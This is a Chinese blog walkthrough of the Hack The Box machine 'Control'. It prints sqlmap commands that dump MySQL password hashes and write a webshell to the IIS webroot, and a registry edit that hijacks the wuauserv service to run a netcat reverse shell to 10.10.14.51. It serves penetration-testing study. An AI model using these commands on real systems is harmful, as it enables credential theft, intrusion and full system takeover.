> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sFdd8RssPPOi0-v9oXQKwQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **93** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/218

靶机难度：中级（4.5/10）

靶机发布日期：2020 年 4 月 21 日

靶机描述：

Control is a hard difficulty Windows machine featuring a site that is found vulnerable to SQL

injection. This is leveraged to extract MySQL user password hashes, and also to write a webshell

and gain a foothold. The password hash for the SQL user hector is cracked, which is used to

move laterally to their Windows account. Examination of the PowerShell history file reveals that

the Registry permissions may have been modified. After enumerating Registry service

permissions and other service properties, a service is abused to gain a shell as NT AUTHORITY\SYSTEM .

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpvp1QeMgFtUBicD4t3BbD7tafJdouM4ZPC9ic9zIsMDAFibDibec0421GBA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.167....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBp0UMq54LicMiciaf2PayjmFIG8pibwXWtzBI49UQpK5XuYAqGI0usib6dficQ/640?wx_fmt=png)

namp 可以发现运行着 MySQL 和 IIS，IIS 版本是 10.0，可能这是 Windows Server 2016 或 Windows Server 2019...

http 也开放着...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpsoicwwlpuN58RdnfRQKiasPcU7KrP9KJyqq7ianjWTqnc9hb5MCCzuTaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpu9VRPJACSUpL5fpkMoj7zt4PNe1n3lE42K3KVUibRYvZjU4Av1x6Htg/640?wx_fmt=png)

访问 http 服务，查看前端源码发现该网站启用 HTTPS，并且证书已存储在 192.168.4.28....

这是个重要的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpxtHKzkAG7W8gOvX2v61B9acQFtbU8FJ1p8xnHol8FibmqDicFOcDGhZQ/640?wx_fmt=png)

返回查看 admin 模块，提示 header 代理问题... 通过 google 可以发现这是 X-Forwarded-For 头部插入...

推荐文章：

```
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpuFSG7rEKdU2qsWQVsTUnBsW9xeIEAvWjF8oJfXojcfQwicTNMljlDlg/640?wx_fmt=png)

通过 bp 插入 X-Forwarded-For，IP 是前面前端发现的 IP 后... 跳转到了管理面板中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpYUToHL8iaB3CNXoQibY0lBkXyS6VYUEunNPfqCEibOZWgSD62Edian8fhw/640?wx_fmt=png)

尝试进行 sql 简单测试，发现存在注入...

为了减少时间，直接利用 sqlmap...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBp16yAEQRRwntAcxPG4f26uPf95pIZRDpI5aExbaeEHCZan6yDxVURMQ/640?wx_fmt=png)

```
sqlmap -r dayu.txt --level 5 --risk 3 --threads 10 --batch -D mysql -T user -C User,Password --dump
```

由于前面 nmap 发现 mysql 开放着，直接利用 sqlmap 获得了所有 user 的 passwd....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpff4BseBo4nykqpnUex6BqMJYo3drrOwmuRfA6oLZQ0thK4tVZccoHA/640?wx_fmt=png)

对 hash 值进行爆破，轻松获得了密码...

现在获得了 mysql 账号和密码信息...

下面思路应该是获得低权 shell 后，需要利用密码修改 $pass 值，或者工具转发等，继续...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBp2Nb603cxbKczCdI3QYicXicz0ibsBtbbE6uzqpPdiapqAKIYlSk4YRCZHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpYLbgib8UiafJsLaaUzcaRAI8OjGMCLVTZc42IqXBcMNPdRH5z17tMrxg/640?wx_fmt=png)

```
sqlmap -r dayu.txt --level 5 --risk 3 --threads 10 --batch --file-write=/root/Desktop/dayuControl/dayucmd.php --file-dest="C:\\inetpub\\wwwroot\\dayucmd.php"
```

这里很多种方法可以上传 shell...

我这里通过我没尝试过的一种 sqlmap 的 --file-write 方法上传了文件或者 shell... 成功上传...

这里还可以利用 powershell... 或者利用简单的 cmd... 执行上传都可以...（跳过）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpCOkniaIMYHTS5knicpAdt47N8yQAUicRI7JHCnZ6MmX9h4xaE4A177eEQ/640?wx_fmt=png)

通过上传的简单 cmd 脚本，正常执行命令...

那这里就简单了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpialmibCQMjxVEBdjrnJB4fLHv1lWibakZmP46HzvHWw8kYZGF0uwZWuMQ/640?wx_fmt=png)

个人觉得 NC 比较稳定，上传了 nc 后获得了反向外壳...

查看用户列表，目前获得的权限不足以查看 user 信息... 需要利用前面获得的 hector 用户的密码进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpgibazvibIx24mfibRYX2kLdwBD18XHu0S0TW46udTMggwVlTia7BbYsf7g/640?wx_fmt=png)

可以查看到 hector 存在的 group 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpiby5JibbSagQtzggjpvxpMia2WcVlK5Aw1ibgh04iatibxdI8TFbkDfWXnFA/640?wx_fmt=png)

这里有两种方法可以获得 hector 权限... 一种修改 pass/cred 值直接提到 hector 权限后执行 shell 即可获得外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpjXAMR5QeVwaibXOS7AuE24I4rywk40rwzKbI6LNibyicl6RcmO3c6SoJg/640?wx_fmt=png)

另外一种通过 netstat 查看到 windows 开放了 5985 端口，前面 nmap 没有发现开放的状态，所以该端口仅在 localhost 上开放着...

这里就可以利用 evil-winrm 访问该端口，利用 kali 自带的 plink.exe 上传到 windows 中，转发下端口即可...

这里就不演示了... 前面讲过很多...

成功获得了 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpUazzUEEm704NokX8Mr6AkMoNOqPMwbdcK10snbUl7zSMhkkykjEatQ/640?wx_fmt=png)

```
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *
```

这里检查 PowerShell 历史记录所有的文件，可以看到 wuauserv 在为 hector 工作着... 可以利用 wuauserv 服务修改其启动路径，然后获得反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpZFreOH9ibWwMNKZtLCCwr4mwlj6K8sgXMl3spazDsstFwMT35WTjgxg/640?wx_fmt=png)利用 sc.exe 查看了服务的启动路径...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpZ1S4e1Qnxq6uw7urADpwCSWrY3yOKMNEh2sicKgvw52um2y4JDLSVoA/640?wx_fmt=png)

```
reg add HKLM\System\CurrentControlSet\services\wuauserv /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Hector\documents\nc64.exe 10.10.14.51 5555 -e cmd.exe" /f
```

然后通过 reg 添加另外的启动命令到 wuauserv 服务中，在利用 sc 进行重新启用... 获得了反向外壳...

获得了 system 权限读取到了 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPbX8iagjAJHm0ltAHfNgSBpibiaXiaKO4ZLss0YNcrdbztAiak1DoM98tbArAibuzLPNyQpXCMK5GBC7HA/640?wx_fmt=png)

这里我上传了 winPEAS 工具爬了所有的信息内容，里面还是很多有趣的信息... 喜欢研究的可以深入看看...

这台主要学到了 sqlmap 的挖掘和上传功能... 其他的内容都是前面讲过的...

这是一台不久刚从 Active 退到 Retired 的机子...

加油！！！

由于我们已经成功得到 system 权限查看 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)